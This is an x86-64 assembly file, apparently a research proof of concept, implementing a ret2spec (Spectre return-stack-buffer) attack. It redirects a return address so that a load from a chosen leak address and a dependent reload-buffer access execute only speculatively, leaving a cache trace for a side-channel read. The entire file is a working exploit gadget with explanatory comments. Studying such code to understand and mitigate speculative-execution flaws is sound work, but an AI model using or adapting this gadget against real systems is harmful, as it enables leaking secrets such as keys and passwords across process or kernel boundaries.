.global ret2spec

.text

// r8: levels of recursions deep
// r9: levels of recursions deep start value
recursive_mispredict:
  // Is r8 zero? In that case, we reached the end of the
  // recursion. Go the base case
  testq %r8, %r8
  jz recursive_mispredict_base

  // Is r8 == r9? In that case, we just started the recursion
  // and we still have to modify the return pointer to let the
  // RSB misspeculate
  cmpq %r8, %r9
  je recursive_mispredict_modify_return_ptr

  // All cases in between: recurse!
  jmp recursive_mispredict_recurse

recursive_mispredict_modify_return_ptr:
  movq $ret2spec_end, (%rsp)

recursive_mispredict_recurse:
  pushq %rbp
  movq %rsp, %rbp
  decq %r8

  call recursive_mispredict

recursive_mispredict_base:
  movq %rbp, %rsp
  popq %rbp
  ret

// rdi: leak address
// rsi: reload buffer
// rdx: amount of entries in the RSB
ret2spec:
  pushq %rbp
  movq %rsp, %rbp

  xor %rax, %rax

  // This is amount of RSB entries. The ret2spec paper says that this
  // is most commonly 16
  movq %rdx, %r8
  movq %r8, %r9

  // This call actually modifies its return pointer to be at
  // ret2spec_end, so the 3 instructions below this call
  // are never executed (except speculatively)
  call recursive_mispredict

  // It should never actually execute this, because the call to
  // recursive_mispredict will modify it's return pointer to ret2spec_end
  movb (%rdi), %al

  // These two instructions are never actually executed, but are speculatively
  // executed. They have a side effect on the cache
  shl $0xc, %eax
  movb (%rsi, %rax, 1), %r10b

ret2spec_end:
  movq %rbp, %rsp
  popq %rbp
  ret
  
